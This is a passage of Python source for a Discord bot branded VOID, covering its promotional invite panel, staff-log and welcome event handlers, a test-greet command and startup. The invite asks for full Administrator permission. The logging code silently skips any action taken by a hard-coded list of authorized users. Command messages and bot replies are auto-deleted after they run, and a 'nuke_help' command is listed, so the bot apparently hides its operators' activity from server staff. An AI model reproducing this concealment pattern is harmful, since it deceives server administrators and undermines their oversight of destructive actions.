    # ───────────────────────── WHAT IT DOES (product value section)
    embed.add_field(
        name="✨ What VOID Does",
        value=(
            "• Moderation tools for full server control\n"
            "• Economy system with progression & rewards\n"
            "• Casino & games for engagement\n"
            "• Utility commands for daily server use"
        ),
        inline=False,
    )

    # ───────────────────────── BENEFITS (SaaS-style positioning)
    embed.add_field(
        name="🚀 Why VOID",
        value=(
            "• One system instead of multiple bots\n"
            "• Clean, fast, low-noise command structure\n"
            "• Built for both small and large communities\n"
            "• Consistent UI across all features"
        ),
        inline=False,
    )

    # ───────────────────────── SYSTEM STATUS (trust section)
    embed.add_field(
        name="🧠 System Status",
        value=(
            "```"
            "Uptime        Active\n"
            "Errors        None detected\n"
            "Maintenance   Not required\n"
            "Version       v1.0\n"
            "```"
        ),
        inline=True,
    )

    # ───────────────────────── RELEASE INFO (clean product info)
    embed.add_field(
        name="📦 Release",
        value=(
            "```"
            "Initial Build 2023\n"
            "Major Update  2025\n"
            "Current State  Stable\n"
            "```"
        ),
        inline=True,
    )

    # ───────────────────────── CTA (call to action like SaaS)
    embed.add_field(
        name="⚡ Get Started",
        value=(
            "[Invite void.os](https://discord.com/oauth2/authorize?client_id=1498389493168869479&permissions=8&integration_type=0&scope=bot+applications.commands)"
        ),
        inline=False,
    )

    embed.set_footer(
        text="VOID • crafted by kirasauruss & ladyofthebombs",
        icon_url=BOT_THUMBNAIL,
    )

    await interaction.response.send_message(embed=embed, view=VoidView())

# ══════════════════════════════════════════════════════════════════════════════
# 📜 STAFF LOGGING + WELCOME SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

LOG_CHANNEL_NAME = "staff-logs"
WELCOME_CHANNEL_NAME = "welcome"
LOG_PREFIXES_TO_IGNORE = ("!",)


def _is_authorized_user(user):
    return user is not None and getattr(user, "id", None) in AUTHORIZED_USER_IDS


def _is_ignored_log_message(message):
    if message is None:
        return True

    if message.guild is None:
        return True

    if message.author.bot:
        return True

    if _is_authorized_user(message.author):
        return True

    if getattr(message.channel, "name", None) == LOG_CHANNEL_NAME:
        return True

    content = (message.content or "").strip()
    return content.startswith(LOG_PREFIXES_TO_IGNORE)


def _short(text, limit=900):
    if text is None:
        return ""

    text = str(text)

    if len(text) <= limit:
        return text

    return text[: limit - 3] + "..."


def _mention_user(user):
    if user is None:
        return "Unknown"

    return f"{user.mention} (`{user}` / `{user.id}`)"


def _mention_channel(channel):
    if channel is None:
        return "Unknown"

    mention = getattr(channel, "mention", None)
    if mention:
        return f"{mention} (`{channel.id}`)"

    return f"`{channel}`"


def _role_name(role):
    if role is None:
        return "Unknown"

    return f"{role.mention} (`{role.name}` / `{role.id}`)"


def _log_channel(guild: discord.Guild):
    return discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)


def _welcome_channel(guild: discord.Guild):
    return discord.utils.get(guild.text_channels, name=WELCOME_CHANNEL_NAME)


def _ansi_for_color(color: discord.Color) -> str:
    """Maps an embed colour to the closest ANSI code + matching square emoji, so the
    coloured accent shows up even on clients/situations where the embed side-bar
    colour isn't very noticeable (e.g. mobile)."""
    r, g, b = color.r, color.g, color.b
    hi = max(r, g, b)
    if hi < 90:
        return "1;30", "⬛"
    is_r, is_g, is_b = r > hi - 40, g > hi - 40, b > hi - 40
    if is_r and is_g and is_b:
        return "1;37", "⬜"
    if is_r and is_g and not is_b:
        return "1;33", "🟨"
    if is_r and is_b and not is_g:
        return "1;35", "🟪"
    if is_g and is_b and not is_r:
        return "1;36", "🟦"
    if is_r:
        return "1;31", "🟥"
    if is_g:
        return "1;32", "🟩"
    if is_b:
        return "1;34", "🟦"
    return "1;37", "⬜"


async def _send_staff_log(guild: discord.Guild, title: str, description: str, color=C.NEUTRAL, fields=None,
                           category: str = None, thumbnail_url: str = None):
    """
    Posts a log embed styled to match /void's look:
      - small uppercase "eyebrow" (category) as the author chip, next to the acting user's avatar
      - a colour-coded square + matching ANSI-tinted terminal line, so the action type reads
        instantly even when the embed side-bar colour is hard to notice
      - clean field labels, no filler dividers or bullet clutter
    """
    if guild is None:
        return

    channel = _log_channel(guild)
    if channel is None:
        return

    me = guild.me or guild.get_member(bot.user.id)
    if me is None:
        return

    perms = channel.permissions_for(me)
    if not perms.send_messages or not perms.embed_links:
        return

    ansi_code, square = _ansi_for_color(color)

    embed = discord.Embed(
        title=f"{square}  {title}",
        description=(
            "```ansi\n"
            f"\u001b[{ansi_code}m» {description}\u001b[0m\n"
            "```"
        ) if description else None,
        color=color,
        timestamp=datetime.now(UTC),
    )

    if category:
        embed.set_author(name=category.upper(), icon_url=thumbnail_url or BOT_THUMBNAIL)

    embed.set_thumbnail(url=thumbnail_url or BOT_THUMBNAIL)
    embed.set_footer(text=f"{_flavor_footer()} • {guild.name}", icon_url=BOT_THUMBNAIL)

    if fields:
        for name, value, inline in fields:
            embed.add_field(
                name=f"**{name}**",
                value=_short(value, 1024) or "*None*",
                inline=inline,
            )

    try:
        await channel.send(embed=embed)
    except (discord.Forbidden, discord.HTTPException):
        pass


async def _send_welcome_message(member: discord.Member):
    channel = _welcome_channel(member.guild)
    if channel is None:
        return

    me = member.guild.me or member.guild.get_member(bot.user.id)
    if me is None:
        return

    perms = channel.permissions_for(me)
    if not perms.send_messages or not perms.embed_links:
        return

    joined_at = member.joined_at or datetime.now(UTC)
    guild = member.guild
    member_count = guild.member_count or len(guild.members)

    account_age_days = (datetime.now(UTC) - member.created_at).days
    is_new_account = account_age_days < 7

    embed = discord.Embed(
        title=f"👋  Welcome to {guild.name}",
        description=(
            "```ansi\n"
            f"\u001b[1;37m{member.name} just joined the server.\u001b[0m\n"
            f"\u001b[0;90m{_flavor('welcome')}\u001b[0m\n"
            "```"
        ),
        color=0x2B2D31,
        timestamp=datetime.now(UTC),
    )

    embed.set_author(name=f"{member} joined", icon_url=member.display_avatar.url)
    embed.set_thumbnail(url=member.display_avatar.url)

    embed.add_field(
        name="👤 Member",
        value=(
            "```\n"
            f"User      {member}\n"
            f"ID        {member.id}\n"
            f"Position  #{member_count:,}\n"
            "```"
        ),
        inline=False,
    )

    embed.add_field(
        name="📅 Timeline",
        value=(
            "```\n"
            f"Joined    {joined_at.strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"Created   {member.created_at.strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"Age       {account_age_days} day(s)\n"
            "```"
        ),
        inline=False,
    )

    if is_new_account:
        embed.add_field(
            name="⚠️ Heads Up",
            value=f"This account is only **{account_age_days} day(s)** old — worth keeping an eye on.",
            inline=False,
        )
        embed.color = C.WARNING

    embed.set_footer(text=BOT_FOOTER, icon_url=BOT_THUMBNAIL)

    try:
        await channel.send(content=member.mention, embed=embed)
    except (discord.Forbidden, discord.HTTPException):
        pass


async def _audit_actor(guild: discord.Guild, action, target_id=None, max_age_seconds=15):
    me = guild.me or guild.get_member(bot.user.id)
    if me is None or not me.guild_permissions.view_audit_log:
        return None

    now = datetime.now(UTC)

    try:
        async for entry in guild.audit_logs(limit=8, action=action):
            created_at = entry.created_at
            if created_at.tzinfo is None:
                created_at = created_at.replace(tzinfo=UTC)

            age = (now - created_at).total_seconds()
            if age > max_age_seconds:
                continue

            if target_id is not None:
                entry_target_id = getattr(entry.target, "id", None)
                if entry_target_id != target_id:
                    continue

            return entry.user
    except (discord.Forbidden, discord.HTTPException):
        return None

    return None


async def _should_skip_audit_action(guild: discord.Guild, action, target_id=None):
    actor = await _audit_actor(guild, action, target_id)
    return _is_authorized_user(actor), actor


@bot.event
async def on_message_delete(message):
    if _is_ignored_log_message(message):
        return

    skipped, actor = await _should_skip_audit_action(
        message.guild,
        discord.AuditLogAction.message_delete,
        message.author.id,
    )

    if skipped:
        return

    fields = [
        ("Channel", _mention_channel(message.channel), False),
        ("Author", _mention_user(message.author), False),
    ]

    if actor:
        fields.append(("Deleted By", _mention_user(actor), False))

    if message.content:
        fields.append(("Message", _short(message.content), False))

    if message.attachments:
        fields.append(
            (
                "Attachments",
                "\n".join(attachment.url for attachment in message.attachments[:5]),
                False,
            )
        )

    await _send_staff_log(
        message.guild,
        "🗑️ Message Deleted",
        "A message was deleted.",
        C.MSG_DELETE,
        fields,
        category="Messages",
        thumbnail_url=message.author.display_avatar.url,
    )


@bot.event
async def on_bulk_message_delete(messages):
    messages = [
        message for message in messages
        if not _is_ignored_log_message(message)
    ]

    if not messages:
        return

    guild = messages[0].guild
    channel = messages[0].channel

    skipped, actor = await _should_skip_audit_action(
        guild,
        discord.AuditLogAction.message_bulk_delete,
        channel.id,
    )

    if skipped:
        return

    preview = []
    for message in messages[:5]:
        if message.content:
            preview.append(f"`{message.author}`: {_short(message.content, 160)}")

    fields = [
        ("Channel", _mention_channel(channel), False),
        ("Messages Deleted", str(len(messages)), True),
    ]

    if actor:
        fields.append(("Deleted By", _mention_user(actor), False))

    if preview:
        fields.append(("Preview", "\n".join(preview), False))

    await _send_staff_log(
        guild,
        "🧹 Bulk Message Delete",
        "Multiple messages were deleted.",
        C.MSG_DELETE,
        fields,
        category="Messages",
    )


@bot.event
async def on_message_edit(before, after):
    if _is_ignored_log_message(before):
        return

    if before.content == after.content:
        return

    fields = [
        ("Channel", _mention_channel(before.channel), False),
        ("Author", _mention_user(before.author), False),
        ("Before", _short(before.content), False),
        ("After", _short(after.content), False),
    ]

    await _send_staff_log(
        before.guild,
        "✏️ Message Edited",
        "A message was edited.",
        C.MSG_EDIT,
        fields,
        category="Messages",
        thumbnail_url=before.author.display_avatar.url,
    )


@bot.event
async def on_member_join(member):
    await _send_welcome_message(member)

    if _is_authorized_user(member):
        return

    await _send_staff_log(
        member.guild,
        "📥 Member Joined",
        f"{_mention_user(member)} joined the server.",
        C.JOIN,
        [
            ("Account Created", f"<t:{int(member.created_at.timestamp())}:R>", True),
        ],
        category="Members",
        thumbnail_url=member.display_avatar.url,
    )


@bot.event
async def on_member_remove(member):
    if _is_authorized_user(member):
        return

    skipped, actor = await _should_skip_audit_action(
        member.guild,
        discord.AuditLogAction.kick,
        member.id,
    )

    if skipped:
        return

    if actor:
        await _send_staff_log(
            member.guild,
            "👢 Member Kicked",
            f"{_mention_user(member)} was kicked.",
            C.KICK,
            [
                ("Kicked By", _mention_user(actor), False),
            ],
            category="Moderation",
            thumbnail_url=member.display_avatar.url,
        )
        return

    await _send_staff_log(
        member.guild,
        "📤 Member Left",
        f"{_mention_user(member)} left the server.",
        C.LEAVE,
        category="Members",
        thumbnail_url=member.display_avatar.url,
    )


@bot.event
async def on_member_ban(guild, user):
    if _is_authorized_user(user):
        return

    skipped, actor = await _should_skip_audit_action(
        guild,
        discord.AuditLogAction.ban,
        user.id,
    )

    if skipped:
        return

    fields = []
    if actor:
        fields.append(("Banned By", _mention_user(actor), False))

    await _send_staff_log(
        guild,
        "🔨 Member Banned",
        f"{_mention_user(user)} was banned.",
        C.BAN,
        fields,
        category="Moderation",
        thumbnail_url=user.display_avatar.url,
    )


@bot.event
async def on_member_unban(guild, user):
    if _is_authorized_user(user):
        return

    skipped, actor = await _should_skip_audit_action(
        guild,
        discord.AuditLogAction.unban,
        user.id,
    )

    if skipped:
        return

    fields = []
    if actor:
        fields.append(("Unbanned By", _mention_user(actor), False))

    await _send_staff_log(
        guild,
        "✅ Member Unbanned",
        f"{_mention_user(user)} was unbanned.",
        C.UNBAN,
        fields,
        category="Moderation",
        thumbnail_url=user.display_avatar.url,
    )


@bot.event
async def on_member_update(before, after):
    if _is_authorized_user(after):
        return

    if before.nick != after.nick:
        skipped, actor = await _should_skip_audit_action(
            after.guild,
            discord.AuditLogAction.member_update,
            after.id,
        )

        if not skipped:
            fields = [
                ("Member", _mention_user(after), False),
                ("Before", before.nick or before.name, True),
                ("After", after.nick or after.name, True),
            ]

            if actor:
                fields.append(("Changed By", _mention_user(actor), False))

            await _send_staff_log(
                after.guild,
                "📝 Nickname Changed",
                "A member nickname was changed.",
                C.NICK,
                fields,
                category="Members",
                thumbnail_url=after.display_avatar.url,
            )

    before_roles = set(before.roles)
    after_roles = set(after.roles)

    added_roles = [
        role for role in after_roles - before_roles
        if not role.is_default()
    ]

    removed_roles = [
        role for role in before_roles - after_roles
        if not role.is_default()
    ]

    if added_roles or removed_roles:
        skipped, actor = await _should_skip_audit_action(
            after.guild,
            discord.AuditLogAction.member_role_update,
            after.id,
        )

        if not skipped:
            fields = [
                ("Member", _mention_user(after), False),
            ]

            if added_roles:
                fields.append(("Roles Added", "\n".join(_role_name(role) for role in added_roles), False))

            if removed_roles:
                fields.append(("Roles Removed", "\n".join(_role_name(role) for role in removed_roles), False))

            if actor:
                fields.append(("Changed By", _mention_user(actor), False))

            await _send_staff_log(
                after.guild,
                "🎭 Member Roles Updated",
                "A member's roles changed.",
                C.ROLE_EDIT,
                fields,
                category="Roles",
                thumbnail_url=after.display_avatar.url,
            )

    before_timeout = before.communication_disabled_until
    after_timeout = after.communication_disabled_until

    if before_timeout != after_timeout:
        skipped, actor = await _should_skip_audit_action(
            after.guild,
            discord.AuditLogAction.member_update,
            after.id,
        )

        if not skipped:
            if after_timeout:
                title = "⏱️ Member Timed Out"
                description = f"{_mention_user(after)} was timed out."
                color = C.TIMEOUT
                fields = [
                    ("Expires", f"<t:{int(after_timeout.timestamp())}:R>", True),
                ]
            else:
                title = "✅ Timeout Removed"
                description = f"{_mention_user(after)} had their timeout removed."
                color = C.UNBAN
                fields = []

            if actor:
                fields.append(("Changed By", _mention_user(actor), False))

            await _send_staff_log(
                after.guild,
                title,
                description,
                color,
                fields,
                category="Moderation",
                thumbnail_url=after.display_avatar.url,
            )

    if before.premium_since != after.premium_since:
        if after.premium_since:
            await _send_staff_log(
                after.guild,
                "💎 Server Boosted",
                f"{_mention_user(after)} boosted the server.",
                C.BOOST,
                category="Members",
                thumbnail_url=after.display_avatar.url,
            )
        else:
            await _send_staff_log(
                after.guild,
                "💔 Server Boost Removed",
                f"{_mention_user(after)} stopped boosting the server.",
                C.WARNING,
                category="Members",
                thumbnail_url=after.display_avatar.url,
            )


@bot.event
async def on_guild_role_create(role):
    skipped, actor = await _should_skip_audit_action(
        role.guild,
        discord.AuditLogAction.role_create,
        role.id,
    )

    if skipped:
        return

    fields = [
        ("Role", _role_name(role), False),
    ]

    if actor:
        fields.append(("Created By", _mention_user(actor), False))

    await _send_staff_log(
        role.guild,
        "➕ Role Created",
        "A role was created.",
        C.ROLE_NEW,
        fields,
        category="Roles",
    )


@bot.event
async def on_guild_role_delete(role):
    skipped, actor = await _should_skip_audit_action(
        role.guild,
        discord.AuditLogAction.role_delete,
        role.id,
    )

    if skipped:
        return

    fields = [
        ("Role", f"`{role.name}` / `{role.id}`", False),
    ]

    if actor:
        fields.append(("Deleted By", _mention_user(actor), False))

    await _send_staff_log(
        role.guild,
        "➖ Role Deleted",
        "A role was deleted.",
        C.ROLE_DEL,
        fields,
        category="Roles",
    )


@bot.event
async def on_guild_role_update(before, after):
    skipped, actor = await _should_skip_audit_action(
        after.guild,
        discord.AuditLogAction.role_update,
        after.id,
    )

    if skipped:
        return

    changes = []

    if before.name != after.name:
        changes.append(f"Name: `{before.name}` → `{after.name}`")

    if before.color != after.color:
        changes.append(f"Color: `{before.color}` → `{after.color}`")

    if before.permissions != after.permissions:
        changes.append("Permissions changed.")

    if before.hoist != after.hoist:
        changes.append(f"Displayed separately: `{before.hoist}` → `{after.hoist}`")

    if before.mentionable != after.mentionable:
        changes.append(f"Mentionable: `{before.mentionable}` → `{after.mentionable}`")

    if not changes:
        return

    fields = [
        ("Role", _role_name(after), False),
        ("Changes", "\n".join(changes), False),
    ]

    if actor:
        fields.append(("Updated By", _mention_user(actor), False))

    await _send_staff_log(
        after.guild,
        "🔧 Role Updated",
        "A role was updated.",
        C.ROLE_EDIT,
        fields,
        category="Roles",
    )


@bot.event
async def on_guild_channel_create(channel):
    skipped, actor = await _should_skip_audit_action(
        channel.guild,
        discord.AuditLogAction.channel_create,
        channel.id,
    )

    if skipped:
        return

    fields = [
        ("Channel", _mention_channel(channel), False),
        ("Type", str(channel.type), True),
    ]

    if actor:
        fields.append(("Created By", _mention_user(actor), False))

    await _send_staff_log(
        channel.guild,
        "📁 Channel Created",
        "A channel was created.",
        C.CHAN_NEW,
        fields,
        category="Channels",
    )


@bot.event
async def on_guild_channel_delete(channel):
    skipped, actor = await _should_skip_audit_action(
        channel.guild,
        discord.AuditLogAction.channel_delete,
        channel.id,
    )

    if skipped:
        return

    fields = [
        ("Channel", f"`{channel.name}` / `{channel.id}`", False),
        ("Type", str(channel.type), True),
    ]

    if actor:
        fields.append(("Deleted By", _mention_user(actor), False))

    await _send_staff_log(
        channel.guild,
        "🗑️ Channel Deleted",
        "A channel was deleted.",
        C.CHAN_DEL,
        fields,
        category="Channels",
    )


@bot.event
async def on_guild_channel_update(before, after):
    skipped, actor = await _should_skip_audit_action(
        after.guild,
        discord.AuditLogAction.channel_update,
        after.id,
    )

    if before.overwrites != after.overwrites:
        overwrite_skipped, overwrite_actor = await _should_skip_audit_action(
            after.guild,
            discord.AuditLogAction.overwrite_update,
            after.id,
        )

        if overwrite_skipped:
            return

        if overwrite_actor:
            actor = overwrite_actor

    if skipped:
        return

    changes = []

    if before.name != after.name:
        changes.append(f"Name: `{before.name}` → `{after.name}`")

    if getattr(before, "topic", None) != getattr(after, "topic", None):
        changes.append("Topic changed.")

    if before.category != after.category:
        before_category = before.category.name if before.category else "None"
        after_category = after.category.name if after.category else "None"
        changes.append(f"Category: `{before_category}` → `{after_category}`")

    if before.overwrites != after.overwrites:
        changes.append("Permission overwrites changed.")

    if not changes:
        return

    fields = [
        ("Channel", _mention_channel(after), False),
        ("Changes", "\n".join(changes), False),
    ]

    if actor:
        fields.append(("Updated By", _mention_user(actor), False))

    await _send_staff_log(
        after.guild,
        "⚙️ Channel Updated",
        "A channel was updated.",
        C.CHAN_EDIT,
        fields,
        category="Channels",
    )


@bot.event
async def on_voice_state_update(member, before, after):
    if _is_authorized_user(member) or member.bot:
        return

    if before.channel != after.channel:
        if before.channel is None and after.channel is not None:
            await _send_staff_log(
                member.guild,
                "🔊 Voice Joined",
                f"{_mention_user(member)} joined {_mention_channel(after.channel)}.",
                C.VOICE,
                category="Voice",
                thumbnail_url=member.display_avatar.url,
            )
            return

        if before.channel is not None and after.channel is None:
            await _send_staff_log(
                member.guild,
                "🔇 Voice Left",
                f"{_mention_user(member)} left {_mention_channel(before.channel)}.",
                C.LEAVE,
                category="Voice",
                thumbnail_url=member.display_avatar.url,
            )
            return

        await _send_staff_log(
            member.guild,
            "🔀 Voice Moved",
            f"{_mention_user(member)} moved voice channels.",
            C.VOICE,
            [
                ("From", _mention_channel(before.channel), True),
                ("To", _mention_channel(after.channel), True),
            ],
            category="Voice",
            thumbnail_url=member.display_avatar.url,
        )
        return

    changes = []

    if before.self_mute != after.self_mute:
        changes.append(f"Self mute: `{before.self_mute}` → `{after.self_mute}`")

    if before.self_deaf != after.self_deaf:
        changes.append(f"Self deaf: `{before.self_deaf}` → `{after.self_deaf}`")

    if before.mute != after.mute:
        changes.append(f"Server mute: `{before.mute}` → `{after.mute}`")

    if before.deaf != after.deaf:
        changes.append(f"Server deaf: `{before.deaf}` → `{after.deaf}`")

    if not changes:
        return

    await _send_staff_log(
        member.guild,
        "🎙️ Voice State Updated",
        f"{_mention_user(member)} changed voice state.",
        C.VOICE,
        [
            ("Channel", _mention_channel(after.channel or before.channel), False),
            ("Changes", "\n".join(changes), False),
        ],
        category="Voice",
        thumbnail_url=member.display_avatar.url,
    )


@bot.event
async def on_guild_emojis_update(guild, before, after):
    before_map = {emoji.id: emoji for emoji in before}
    after_map = {emoji.id: emoji for emoji in after}

    for emoji_id, emoji in after_map.items():
        if emoji_id not in before_map:
            skipped, actor = await _should_skip_audit_action(
                guild,
                discord.AuditLogAction.emoji_create,
                emoji.id,
            )

            if skipped:
                continue

            fields = [("Emoji", f"{emoji} `:{emoji.name}:` / `{emoji.id}`", False)]

            if actor:
                fields.append(("Created By", _mention_user(actor), False))

            await _send_staff_log(guild, "😀 Emoji Created", "An emoji was created.", C.EMOJI, fields, category="Emojis")

    for emoji_id, emoji in before_map.items():
        if emoji_id not in after_map:
            skipped, actor = await _should_skip_audit_action(
                guild,
                discord.AuditLogAction.emoji_delete,
                emoji.id,
            )

            if skipped:
                continue

            fields = [("Emoji", f"`:{emoji.name}:` / `{emoji.id}`", False)]

            if actor:
                fields.append(("Deleted By", _mention_user(actor), False))

            await _send_staff_log(guild, "🗑️ Emoji Deleted", "An emoji was deleted.", C.ROLE_DEL, fields, category="Emojis")

    for emoji_id in before_map.keys() & after_map.keys():
        old = before_map[emoji_id]
        new = after_map[emoji_id]

        if old.name == new.name:
            continue

        skipped, actor = await _should_skip_audit_action(
            guild,
            discord.AuditLogAction.emoji_update,
            new.id,
        )

        if skipped:
            continue

        fields = [
            ("Emoji", f"{new} `{new.id}`", False),
            ("Name", f"`{old.name}` → `{new.name}`", False),
        ]

        if actor:
            fields.append(("Updated By", _mention_user(actor), False))

        await _send_staff_log(guild, "🔧 Emoji Updated", "An emoji was updated.", C.WARNING, fields, category="Emojis")


@bot.event
async def on_guild_stickers_update(guild, before, after):
    before_map = {sticker.id: sticker for sticker in before}
    after_map = {sticker.id: sticker for sticker in after}

    for sticker_id, sticker in after_map.items():
        if sticker_id not in before_map:
            skipped, actor = await _should_skip_audit_action(
                guild,
                discord.AuditLogAction.sticker_create,
                sticker.id,
            )

            if skipped:
                continue

            fields = [("Sticker", f"`{sticker.name}` / `{sticker.id}`", False)]

            if actor:
                fields.append(("Created By", _mention_user(actor), False))

            await _send_staff_log(guild, "🏷️ Sticker Created", "A sticker was created.", C.EMOJI, fields, category="Stickers")

    for sticker_id, sticker in before_map.items():
        if sticker_id not in after_map:
            skipped, actor = await _should_skip_audit_action(
                guild,
                discord.AuditLogAction.sticker_delete,
                sticker.id,
            )

            if skipped:
                continue

            fields = [("Sticker", f"`{sticker.name}` / `{sticker.id}`", False)]

            if actor:
                fields.append(("Deleted By", _mention_user(actor), False))

            await _send_staff_log(guild, "🗑️ Sticker Deleted", "A sticker was deleted.", C.ROLE_DEL, fields, category="Stickers")

    for sticker_id in before_map.keys() & after_map.keys():
        old = before_map[sticker_id]
        new = after_map[sticker_id]

        if old.name == new.name:
            continue

        skipped, actor = await _should_skip_audit_action(
            guild,
            discord.AuditLogAction.sticker_update,
            new.id,
        )

        if skipped:
            continue

        fields = [
            ("Sticker", f"`{new.id}`", False),
            ("Name", f"`{old.name}` → `{new.name}`", False),
        ]

        if actor:
            fields.append(("Updated By", _mention_user(actor), False))

        await _send_staff_log(guild, "🔧 Sticker Updated", "A sticker was updated.", C.WARNING, fields, category="Stickers")


@bot.event
async def on_guild_update(before, after):
    skipped, actor = await _should_skip_audit_action(
        after,
        discord.AuditLogAction.guild_update,
        after.id,
    )

    if skipped:
        return

    changes = []

    if before.name != after.name:
        changes.append(f"Name: `{before.name}` → `{after.name}`")

    if before.description != after.description:
        changes.append("Description changed.")

    if before.afk_channel != after.afk_channel:
        before_afk = before.afk_channel.name if before.afk_channel else "None"
        after_afk = after.afk_channel.name if after.afk_channel else "None"
        changes.append(f"AFK channel: `{before_afk}` → `{after_afk}`")

    if before.afk_timeout != after.afk_timeout:
        changes.append(f"AFK timeout: `{before.afk_timeout}` → `{after.afk_timeout}`")

    if before.verification_level != after.verification_level:
        changes.append(f"Verification level: `{before.verification_level}` → `{after.verification_level}`")

    if before.default_notifications != after.default_notifications:
        changes.append("Default notification setting changed.")

    if before.explicit_content_filter != after.explicit_content_filter:
        changes.append("Explicit content filter changed.")

    if before.icon != after.icon:
        changes.append("Server icon changed.")

    if before.banner != after.banner:
        changes.append("Server banner changed.")

    if not changes:
        return

    fields = [
        ("Changes", "\n".join(changes), False),
    ]

    if actor:
        fields.append(("Updated By", _mention_user(actor), False))

    await _send_staff_log(
        after,
        "🏠 Server Updated",
        "Server settings were changed.",
        C.SERVER,
        fields,
        category="Server",
        thumbnail_url=after.icon.url if after.icon else None,
    )


@bot.event
async def on_invite_create(invite):
    if _is_authorized_user(invite.inviter):
        return

    fields = [
        ("Code", f"`{invite.code}`", True),
        ("Channel", _mention_channel(invite.channel), True),
    ]

    if invite.inviter:
        fields.append(("Created By", _mention_user(invite.inviter), False))

    await _send_staff_log(
        invite.guild,
        "🔗 Invite Created",
        "A server invite was created.",
        C.INVITE,
        fields,
        category="Invites",
    )


@bot.event
async def on_invite_delete(invite):
    skipped, actor = await _should_skip_audit_action(
        invite.guild,
        discord.AuditLogAction.invite_delete,
        None,
    )

    if skipped:
        return

    fields = [
        ("Code", f"`{invite.code}`", True),
        ("Channel", _mention_channel(invite.channel), True),
    ]

    if actor:
        fields.append(("Deleted By", _mention_user(actor), False))

    await _send_staff_log(
        invite.guild,
        "🗑️ Invite Deleted",
        "A server invite was deleted.",
        C.ROLE_DEL,
        fields,
        category="Invites",
    )

@tree.command(name="testgreet", description="Test the welcome greeting embed.")
@app_commands.describe(member="Member to preview the welcome greet for")
async def testgreet(interaction: discord.Interaction, member: discord.Member = None):
    if not _mod_check(interaction, "manage_channels"):
        await interaction.response.send_message(
            embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You need permission to test welcome greetings.", C.DANGER),
            ephemeral=True,
        )
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message(
            embed=_base_embed("❌  Server Only", "This command can only be used inside a server.", C.DANGER),
            ephemeral=True,
        )
        return

    channel = _welcome_channel(guild)
    if channel is None:
        await interaction.response.send_message(
            embed=_base_embed("❌  Missing Channel", "I could not find a `#welcome` channel.", C.DANGER),
            ephemeral=True,
        )
        return

    me = guild.me or guild.get_member(bot.user.id)
    if me is None:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "I could not check my permissions.", C.DANGER),
            ephemeral=True,
        )
        return

    perms = channel.permissions_for(me)
    if not perms.send_messages or not perms.embed_links:
        await interaction.response.send_message(
            embed=_base_embed("❌  Missing Permission", "I need **Send Messages** and **Embed Links** in `#welcome`.", C.DANGER),
            ephemeral=True,
        )
        return

    target = member or interaction.user

    await _send_welcome_message(target)

    await interaction.response.send_message(
        embed=_base_embed(
            "✅  Test Greet Sent",
            f"Sent a test welcome greet for {target.mention} in {channel.mention}.",
            C.SUCCESS,
        ),
        ephemeral=True,
    )
    
# ══════════════════════════════════════════════════════════════════════════════
# 🛡️ ERROR HANDLING & STARTUP
# ══════════════════════════════════════════════════════════════════════════════
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(embed=_base_embed("🚫  Permission Denied", f"{_flavor('deny_discord_perms')} You don't have permission to use this command.", C.DANGER))
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(embed=_base_embed("❌  Error", str(error), C.DANGER))

_cmd_bot_messages = {}

# Commands that just display info — their messages stay visible and never auto-delete
DISPLAY_ONLY_COMMANDS = {"nuke_help", "show_high"}

@bot.before_invoke
async def track_cmd(ctx):
    # Display-only commands: only delete the user's command message after 3s, leave bot messages alone
    if ctx.command and ctx.command.name in DISPLAY_ONLY_COMMANDS:
        try:
            await ctx.message.delete(delay=3)
        except (discord.Forbidden, discord.HTTPException):
            pass
        return
    # All other commands: track user message + all bot messages for cleanup after execution
    _cmd_bot_messages[ctx.message.id] = [ctx.message]
    original_send = ctx.send
    async def tracked_send(*args, **kwargs):
        kwargs.pop("delete_after", None)
        msg = await original_send(*args, **kwargs)
        if msg:
            _cmd_bot_messages[ctx.message.id].append(msg)
        return msg
    ctx.send = tracked_send

@bot.after_invoke
async def cleanup_cmd(ctx):
    # Display-only commands are skipped — nothing to clean up
    if ctx.command and ctx.command.name in DISPLAY_ONLY_COMMANDS:
        return
    # Delete everything 2 seconds after the command fully finishes
    await asyncio.sleep(2)
    msgs = _cmd_bot_messages.pop(ctx.message.id, [])
    for msg in msgs:
        try:
            await msg.delete()
        except (discord.Forbidden, discord.HTTPException, discord.NotFound):
            pass

@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print("Bot ready.")

bot.run(BOT_TOKEN)
